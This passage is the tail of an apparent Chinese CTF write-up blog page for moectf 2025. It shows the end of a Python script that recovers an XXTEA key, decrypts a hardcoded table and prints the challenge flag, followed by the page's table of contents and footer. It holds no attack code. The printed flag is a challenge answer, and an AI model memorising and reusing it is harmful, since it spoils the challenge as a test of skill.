v11_prev, v10_prev, v9_prev, v8_prev, v7_prev, v6_prev, v12_prev</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [v21, v6, v7, v8, v9, v10, v11, v13, v27, v3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1) 计算真正用于 XXTEA 的前 64bit 密钥（来自 sub_140001070）</span></span><br><span class="line">    k0, k1 = sub_140001070_v10()  <span class="comment"># 0x63656F6D, 0x21216674  =&gt; &quot;moec&quot;, &quot;tf!!&quot;</span></span><br><span class="line">    KEY = [k0, k1, <span class="number">0x12345678</span>, <span class="number">0x9ABCDEF0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) v15（比较表）当作“密文”解回明文 40 字节</span></span><br><span class="line">    V15 = [<span class="number">1566723124</span>, -<span class="number">2044068179</span>, -<span class="number">1659816037</span>, -<span class="number">53136879</span>, <span class="number">1175413710</span>,</span><br><span class="line">           -<span class="number">981373336</span>, -<span class="number">28114771</span>, <span class="number">167777774</span>, -<span class="number">1744380997</span>, -<span class="number">280353208</span>]</span><br><span class="line">    V15 = [u32(x) <span class="keyword">for</span> x <span class="keyword">in</span> V15]</span><br><span class="line">    words = decrypt_words(V15, KEY)</span><br><span class="line">    pt = <span class="string">b&#x27;&#x27;</span>.join((w &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> w <span class="keyword">in</span> words)</span><br><span class="line">    <span class="built_in">print</span>(pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># moectf&#123;X7e4_And_xx7EA_I5_BeautifuL!!!!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


















  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-LSB"><span class="toc-number">1.1.</span> <span class="toc-text">ez_LSB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTV"><span class="toc-number">1.2.</span> <span class="toc-text">SSTV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%82%E4%BD%8F%E4%B8%80%E5%8F%AA%E8%80%B3"><span class="toc-number">1.3.</span> <span class="toc-text">捂住一只耳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enchantment"><span class="toc-number">1.4.</span> <span class="toc-text">Enchantment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-png"><span class="toc-number">1.5.</span> <span class="toc-text">ez_png</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypted-pdf"><span class="toc-number">1.6.</span> <span class="toc-text">encrypted_pdf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-ssl"><span class="toc-number">1.7.</span> <span class="toc-text">ez_ssl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebRepo"><span class="toc-number">1.8.</span> <span class="toc-text">WebRepo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weird-photo"><span class="toc-number">1.9.</span> <span class="toc-text">weird_photo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%9F%BA%E7%B1%B3%E9%9A%BE%E6%B2%A1%E9%9C%B2%E8%BA%B2"><span class="toc-number">2.</span> <span class="toc-text">哈基米难没露躲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-number">4.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">4.1.</span> <span class="toc-text">0 Web入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="toc-number">4.2.</span> <span class="toc-text">01 第一章 神秘的手镯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="toc-number">4.3.</span> <span class="toc-text">02 第二章 初识金曦玄轨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="toc-number">4.4.</span> <span class="toc-text">03 第三章 问剑石！篡天改命！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="toc-number">4.5.</span> <span class="toc-text">04 第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="toc-number">4.6.</span> <span class="toc-text">05 第五章 打上门来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="toc-number">4.7.</span> <span class="toc-text">06 第六章 藏经禁制？玄机初探！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="toc-number">4.8.</span> <span class="toc-text">07 第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="toc-number">4.9.</span> <span class="toc-text">08 第八章 天衍真言，星图显圣</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="toc-number">4.10.</span> <span class="toc-text">Moe笑传之猜猜爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-number">5.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text">09 第九章 星墟禁制·天机问路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="toc-number">5.2.</span> <span class="toc-text">13 第十三章 通幽关·灵纹诡影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="toc-number">5.3.</span> <span class="toc-text">14 第十四章 御神关·补天玉碑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="toc-number">5.4.</span> <span class="toc-text">12 第十二章 玉魄玄关·破妄</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%B8%E9%87%91%E5%81%B6%E9%81%87FLAG%EF%BC%8C%E6%8B%BC%E5%B0%BD%E5%85%A8%E5%8A%9B%E9%9A%BE%E6%88%98%E8%83%9C"><span class="toc-number">5.5.</span> <span class="toc-text">摸金偶遇FLAG，拼尽全力难战胜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="toc-number">5.6.</span> <span class="toc-text">10 第十章 天机符阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="toc-number">5.7.</span> <span class="toc-text">11 第十一章 千机变·破妄之眼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="toc-number">5.8.</span> <span class="toc-text">10 第十章 天机符阵_revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">6.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF-revenge"><span class="toc-number">6.1.</span> <span class="toc-text">01 第一章 神秘的手镯_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="toc-number">6.2.</span> <span class="toc-text">15 第十五章 归真关·竞时净魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="toc-number">6.3.</span> <span class="toc-text">16 第十六章 昆仑星途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="toc-number">6.4.</span> <span class="toc-text">17 第十七章 星骸迷阵·神念重构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="toc-number">6.5.</span> <span class="toc-text">18 第十八章 万卷诡阁·功法连环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="toc-number">6.6.</span> <span class="toc-text">19 第十九章 星穹真相·补天归源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="toc-number">6.7.</span> <span class="toc-text">19 第十九章_revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">7.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">这是…Webshell？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell-revenge"><span class="toc-number">7.2.</span> <span class="toc-text">这是…Webshell?_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="toc-number">7.3.</span> <span class="toc-text">20 第二十章 幽冥血海·幻语心魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="toc-number">7.4.</span> <span class="toc-text">21 第二十一章 往生漩涡·言灵死局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">7.5.</span> <span class="toc-text">22 第二十二章：血海核心·千年手段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">8.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upx"><span class="toc-number">8.1.</span> <span class="toc-text">upx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez3"><span class="toc-number">8.2.</span> <span class="toc-text">ez3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flower"><span class="toc-number">8.3.</span> <span class="toc-text">flower</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#catch"><span class="toc-number">8.4.</span> <span class="toc-text">catch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpy"><span class="toc-number">8.5.</span> <span class="toc-text">ezpy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-cup-of-tea"><span class="toc-number">8.6.</span> <span class="toc-text">A cup of tea</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Two-cups-of-tea"><span class="toc-number">8.7.</span> <span class="toc-text">Two cups of tea</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&text=moectf 2025 misc&amp;web"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&is_video=false&description=moectf 2025 misc&amp;web"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=moectf 2025 misc&amp;web&body=Check out this article: http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&name=moectf 2025 misc&amp;web&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&t=moectf 2025 misc&amp;web"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    y@7q
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
